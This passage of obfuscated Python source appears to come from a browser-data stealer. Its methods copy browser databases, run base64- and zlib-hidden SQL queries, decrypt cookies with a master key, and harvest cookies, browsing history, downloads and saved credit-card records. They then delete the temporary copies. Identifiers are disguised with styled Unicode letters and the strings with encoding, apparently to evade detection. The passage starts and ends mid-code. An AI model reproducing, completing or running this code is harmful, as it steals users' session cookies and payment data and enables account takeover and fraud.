        𝗰𝗼𝘯𝘯 = 𝘀𝗾𝗹𝘪𝘁𝘦3.connect(__𝘪𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9I6\xb4\xcc\x8eL\xb7\xb5\x05\x00+\x8c\x05\x18')).decode())
        𝘴𝘦𝙩𝙖𝘁𝘁𝙧(𝗰𝙤𝗻𝘯, 'text_factory', 𝙗𝘺𝙩𝙚𝘴)
        𝙘𝘶𝙧𝘀𝗼𝗿 = 𝘤𝗼𝘯𝗻.cursor()
        𝙘𝙪𝙧𝘴𝗼𝙧.execute(__𝘪𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xcf(K6\x0eJK4\n3\xf5qv*\x8d\x0c7\xcc\x01\xd2\xe5\x91\x11A\xf9@:\')\xd7\xaf25\xc2\xc9 *<(-%\xd7\xad8%<\xb48*"\xa3<1\xc2+\'\xd9\xd0\xd20\xc5\xdd7=(\xc7+ $\xd8)+\xc9\xc8\xb2(1<\xac\n\x00\x84\xd0\x1e\xe1')).decode())
        for 𝘳𝙤𝘄 in 𝘤𝘂𝗿𝘴𝗼𝙧.fetchall():
            if not 𝘳𝘰𝙬[𝘪𝗻𝙩.from_bytes(𝘮𝗮𝘱(lambda O, i: 493 - (𝗶𝗻𝘁(𝘖) + 𝘪), 𝘮𝘢𝙥(__𝗶𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝗶𝙩𝘦𝘳(__𝗶𝗺𝘱𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝗲(0)), __𝗶𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝙤𝘄[𝙞𝘯𝙩.from_bytes(𝙢𝘢𝙥(lambda O, i: 601 - (𝗶𝙣𝙩(𝘖) + 𝙞), 𝙢𝙖𝙥(__𝘪𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝘪𝙩𝘦𝗿(__𝙞𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xcbr,\x07\x00\x03s\x01q')).decode())] * 3)), 𝙧𝙖𝗻𝙜𝘦(1)), __𝘪𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝙤𝙬[𝙞𝙣𝘁.from_bytes(𝘮𝙖𝗽(lambda O, i: 609 - (𝗶𝘯𝙩(𝘖) + 𝘪), 𝗺𝘢𝗽(__𝘪𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝘪𝘁𝙚𝙧(__𝙞𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcbr4\x06\x00\x03/\x01-')).decode())] * 3)), 𝘳𝗮𝘯𝘨𝙚(1)), __𝗶𝙢𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝗿𝙤𝘸[𝘪𝘯𝘁.from_bytes(𝗺𝙖𝙥(lambda O, i: 479 - (𝙞𝗻𝙩(𝘖) + 𝗶), 𝙢𝘢𝙥(__𝙞𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝘪𝘵𝙚𝗿(__𝙞𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3sI6\x02\x00\x03\x00\x01(')).decode())] * 3)), 𝙧𝙖𝙣𝘨𝘦(1)), __𝗶𝗺𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝙘𝘰𝙤𝘬𝘪𝗲 = 𝘴𝙚𝘭𝙛.decrypt_password(𝗿𝘰𝘸[𝘪𝘯𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 491 - (𝗶𝗻𝘵(𝘖) + 𝘪), 𝘮𝘢𝘱(__𝘪𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝙞𝘁𝘦𝙧(__𝙞𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3sI7\x01\x00\x03\n\x01.')).decode())] * 3)), 𝙧𝘢𝘯𝘨𝗲(1)), __𝙞𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘀𝗲𝘭𝗳.master_key)
            𝙧𝗼𝘸 = [𝘅.decode(__𝙞𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKrw3H\x0c7)\xf1\r\xb4\xb5\x05\x00\x17\xe0\x03\x98')).decode()) if 𝙞𝘴𝙞𝘯𝘴𝘁𝗮𝗻𝙘𝙚(𝘹, 𝗯𝘺𝘁𝘦𝘴) else 𝙭 for 𝘅 in 𝙧𝙤𝙬]
            __𝗖𝙊𝗢𝘒𝘐𝘌𝗦__.append(𝘛𝘆𝙥𝙚𝙨.Cookie(𝗿𝘰𝙬[𝗶𝘯𝘵.from_bytes(𝘮𝘢𝘱(lambda O, i: 296 - (𝘪𝙣𝘵(𝘖) + 𝙞), 𝘮𝗮𝙥(__𝙞𝗺𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝗶𝙩𝙚𝗿(__𝗶𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝙣𝙜𝗲(0)), __𝘪𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝙤𝘸[𝗶𝙣𝘁.from_bytes(𝗺𝗮𝗽(lambda O, i: 968 - (𝘪𝘯𝘵(𝗢) + 𝘪), 𝘮𝗮𝗽(__𝗶𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝙩𝙚𝗿(__𝗶𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\x0f\x894\x06\x00\x03!\x010')).decode())] * 3)), 𝘳𝘢𝙣𝗴𝙚(1)), __𝗶𝗺𝘱𝗼𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝘰𝘸[𝗶𝘯𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 713 - (𝙞𝘯𝘁(𝘖) + 𝘪), 𝗺𝙖𝘱(__𝙞𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝗶𝘁𝙚𝘳(__𝙞𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xabr\xad\x00\x00\x03\xac\x01\x86')).decode())] * 3)), 𝘳𝙖𝙣𝙜𝙚(1)), __𝙞𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗰𝘰𝗼𝗸𝗶𝗲, 𝙧𝗼𝘸[𝙞𝙣𝘵.from_bytes(𝗺𝗮𝗽(lambda O, i: 658 - (𝙞𝗻𝘁(𝘖) + 𝗶), 𝗺𝗮𝗽(__𝘪𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝘪𝘁𝗲𝙧(__𝙞𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xcb\n5\x00\x00\x03T\x01>')).decode())] * 3)), 𝙧𝗮𝘯𝙜𝙚(1)), __𝘪𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝘂𝘳𝘴𝙤𝘳.close()
        𝙘𝗼𝗻𝗻.close()
        𝘰𝙨.remove(__𝗶𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9I6\xb4\xcc\x8eL\xb7\xb5\x05\x00+\x8c\x05\x18')).decode())

    def get_web_history(self, path):
        𝗵𝘪𝙨𝘁𝘰𝗿𝙮_𝘥𝘣 = __𝙞𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK56L\x0ev\xcf\xa9Jq\xb7\xacL\r\xb4\xb5\x05\x00,\x87\x05:')).decode().format(𝘱𝘢𝘵𝗵)
        if not 𝘰𝘀.path.exists(𝙝𝘪𝙨𝘁𝗼𝗿𝙮_𝗱𝘣):
            return
        𝙨𝘩𝘶𝘁𝗶𝗹.copy(𝘩𝙞𝙨𝘵𝙤𝘳𝙮_𝙙𝗯, __𝘪𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKt\xcf\xa9Jq\xb7\xacL\r\xb3\xcc\x8eL\xb7\xb5\x05\x000\xda\x05\x85')).decode())
        𝘤𝘰𝙣𝙣 = 𝙨𝘲𝗹𝘪𝘁𝙚3.connect(__𝘪𝗺𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKt\xcf\xa9Jq\xb7\xacL\r\xb3\xcc\x8eL\xb7\xb5\x05\x000\xda\x05\x85')).decode())
        𝘤𝘂𝙧𝘴𝗼𝙧 = 𝘤𝗼𝘯𝙣.cursor()
        𝙘𝘂𝘳𝘴𝘰𝗿.execute(__𝗶𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xabLr.OOq\xcf1Hr\x0f-\xf6t\xaf\xc8H6\x0eJK\xc9\xcd\xa9J\x8c\x00\xd2\xee9%Q\xc1N\xee\xa1\xd9\x96~`\xb5\x1e\xbe\xb6\x00q\xa2\x14\x90')).decode())
        for 𝘳𝙤𝘸 in 𝙘𝘶𝙧𝘴𝘰𝙧.fetchall():
            if not 𝙧𝙤𝘄[𝗶𝙣𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 943 - (𝘪𝙣𝘁(𝘖) + 𝙞), 𝙢𝘢𝗽(__𝘪𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝘪𝙩𝗲𝙧(__𝙞𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝙣𝘨𝙚(0)), __𝙞𝙢𝙥𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝙧𝘰𝘄[𝙞𝙣𝘁.from_bytes(𝗺𝗮𝙥(lambda O, i: 797 - (𝗶𝗻𝙩(𝘖) + 𝗶), 𝙢𝘢𝙥(__𝗶𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝘪𝘁𝙚𝘳(__𝙞𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xab\xca6\x02\x00\x03\xb2\x01f')).decode())] * 3)), 𝘳𝗮𝙣𝘨𝘦(1)), __𝙞𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝘰𝘸[𝘪𝙣𝙩.from_bytes(𝘮𝗮𝘱(lambda O, i: 804 - (𝘪𝙣𝘁(𝙊) + 𝘪), 𝗺𝘢𝘱(__𝙞𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝗶𝘁𝙚𝙧(__𝙞𝙢𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3wq\xac\x04\x00\x03\x07\x01N')).decode())] * 3)), 𝗿𝗮𝗻𝙜𝘦(1)), __𝘪𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            __𝗪𝘌𝘽_𝗛𝘐𝙎𝙏𝘖𝙍𝗬__.append(𝗧𝘺𝙥𝘦𝙨.WebHistory(𝙧𝗼𝘄[𝙞𝗻𝘵.from_bytes(𝘮𝗮𝘱(lambda O, i: 631 - (𝗶𝗻𝘵(𝘖) + 𝙞), 𝙢𝘢𝘱(__𝘪𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝘵𝙚𝘳(__𝙞𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝙣𝘨𝙚(0)), __𝘪𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝘰𝘄[𝗶𝗻𝘁.from_bytes(𝘮𝙖𝘱(lambda O, i: 769 - (𝗶𝗻𝘁(𝙊) + 𝘪), 𝙢𝘢𝙥(__𝙞𝙢𝗽𝘰𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝘪𝘵𝘦𝘳(__𝙞𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xab\x8a4\x01\x00\x03\x90\x01V')).decode())] * 3)), 𝗿𝗮𝘯𝘨𝗲(1)), __𝗶𝘮𝙥𝗼𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝙤𝘄[𝘪𝙣𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 330 - (𝙞𝗻𝘵(𝙊) + 𝘪), 𝗺𝘢𝘱(__𝗶𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝘪𝘵𝗲𝙧(__𝗶𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xad\xf24\x01\x00\x03l\x01E')).decode())] * 3)), 𝙧𝘢𝘯𝗴𝗲(1)), __𝙞𝗺𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝘤𝙪𝗿𝙨𝙤𝗿.close()
        𝙘𝘰𝗻𝘯.close()
        𝙤𝙨.remove(__𝘪𝙢𝘱𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKt\xcf\xa9Jq\xb7\xacL\r\xb3\xcc\x8eL\xb7\xb5\x05\x000\xda\x05\x85')).decode())

    def get_downloads(self, path):
        𝘥𝗼𝙬𝗻𝘭𝘰𝙖𝙙𝘴_𝗱𝗯 = __𝘪𝘮𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK56L\x0ev\xcf\xa9Jq\xb7\xacL\r\xb4\xb5\x05\x00,\x87\x05:')).decode().format(𝙥𝙖𝘁𝙝)
        if not 𝗼𝘀.path.exists(𝘥𝗼𝘸𝙣𝙡𝗼𝗮𝙙𝙨_𝙙𝘣):
            return
        𝘀𝘩𝘶𝘵𝘪𝙡.copy(𝘥𝘰𝘸𝘯𝙡𝗼𝙖𝙙𝘀_𝙙𝙗, __𝗶𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝙘𝘰𝗻𝙣 = 𝘀𝙦𝘭𝘪𝘵𝙚3.connect(__𝘪𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝘤𝙪𝘳𝘀𝘰𝗿 = 𝘤𝘰𝙣𝗻.cursor()
        𝙘𝘶𝙧𝙨𝘰𝘳.execute(__𝗶𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xca\x88\xcc\xb14L\xce-/\x06\xb1\x93sSrR\xdc,\xcb##\x82\xf2=]\xa3\x82C\x0c\x0c\xd2\xa3\xdc-\x8d\x93r+\xca"\xc3\x83\xaa\x00\x13\xf6\x12\xfa')).decode())
        for 𝙧𝘰𝘸 in 𝗰𝘂𝗿𝙨𝗼𝗿.fetchall():
            if not 𝘳𝗼𝙬[𝗶𝙣𝙩.from_bytes(𝗺𝙖𝗽(lambda O, i: 714 - (𝗶𝗻𝙩(𝗢) + 𝘪), 𝗺𝙖𝘱(__𝘪𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝙞𝙩𝘦𝗿(__𝘪𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝘨𝘦(0)), __𝗶𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝙧𝗼𝘸[𝗶𝘯𝘵.from_bytes(𝗺𝘢𝗽(lambda O, i: 638 - (𝙞𝙣𝘵(𝘖) + 𝗶), 𝙢𝘢𝗽(__𝙞𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝙞𝘁𝗲𝘳(__𝙞𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xcb\xf25\x06\x00\x03G\x019')).decode())] * 3)), 𝘳𝗮𝙣𝘨𝗲(1)), __𝗶𝘮𝗽𝗼𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]:
                continue
            __𝘋𝘖𝗪𝙉𝘓𝘖𝗔𝘋𝙎__.append(𝗧𝘆𝗽𝙚𝙨.Download(𝘳𝗼𝘄[𝙞𝙣𝘵.from_bytes(𝙢𝘢𝗽(lambda O, i: 918 - (𝘪𝗻𝘵(𝗢) + 𝘪), 𝗺𝙖𝙥(__𝙞𝙢𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝘪𝘁𝙚𝘳(__𝘪𝙢𝘱𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝘯𝘨𝙚(0)), __𝘪𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝙤𝙬[𝙞𝙣𝘁.from_bytes(𝘮𝘢𝗽(lambda O, i: 581 - (𝘪𝘯𝘁(𝗢) + 𝙞), 𝘮𝙖𝘱(__𝗶𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝘪𝘁𝙚𝘳(__𝘪𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3\x0bI/\x07\x00\x03}\x01\x81')).decode())] * 3)), 𝘳𝗮𝘯𝘨𝗲(1)), __𝗶𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝘂𝘳𝘀𝙤𝗿.close()
        𝗰𝘰𝗻𝘯.close()
        𝙤𝘴.remove(__𝗶𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())

    def get_credit_cards(self, path):
        𝙘𝗮𝙧𝘥𝘀_𝘥𝙗 = __𝘪𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK56L\x0e3\n\xcb\xf4t\r\xcaHqw\xb5\x05\x00)\x98\x04\xe9')).decode().format(𝙥𝗮𝘁𝗵)
        if not 𝘰𝘴.path.exists(𝗰𝘢𝙧𝙙𝘴_𝘥𝗯):
            return
        𝘀𝗵𝘂𝘵𝘪𝘭.copy(𝘤𝘢𝙧𝗱𝙨_𝗱𝗯, __𝗶𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝘤𝘰𝘯𝘯 = 𝘴𝗾𝙡𝗶𝘵𝘦3.connect(__𝘪𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝘤𝘂𝘳𝘴𝙤𝙧 = 𝙘𝗼𝘯𝗻.cursor()
        𝘤𝘂𝘳𝘴𝘰𝙧.execute(__𝙞𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdae\x8dA\x0b\xc2 \x18\x86\xff\x92\t\x1e<t\xd9`6i\xa3,\xf5\x9b7]\xdbd~\x83\xa0h\xf8\xef\x13:v}\xde\x87\xf7\xd1\xc4tJ\xf7\xba\x15,\x06k\xe6@\xd9<\xd0&\xbbz_\x1c\xc4\xdd\x83\x8c\x0f\x81\x9f\x80\xfc]6\xe2\xff9s\xb6\xc9\xe7\xbaZ\x07\x90\t(;\x04+qD\x8ea\xeb\xf3\x04\x15q\xf6\xfaj\x85*~\xf9\xb7<y\xeb\x9e\x85-\n\xe5\xe5~\xab\xd6q3\xc9\x83\xfauO\xdd\xf1\x0b\xa1_2\x87')).decode())
        for 𝙧𝗼𝙬 in 𝘤𝘶𝙧𝘀𝘰𝘳.fetchall():
            if not 𝘳𝘰𝘄[𝗶𝙣𝙩.from_bytes(𝙢𝙖𝗽(lambda O, i: 309 - (𝙞𝗻𝙩(𝙊) + 𝗶), 𝗺𝘢𝙥(__𝙞𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝙞𝘵𝘦𝙧(__𝙞𝙢𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝙣𝗴𝗲(0)), __𝘪𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 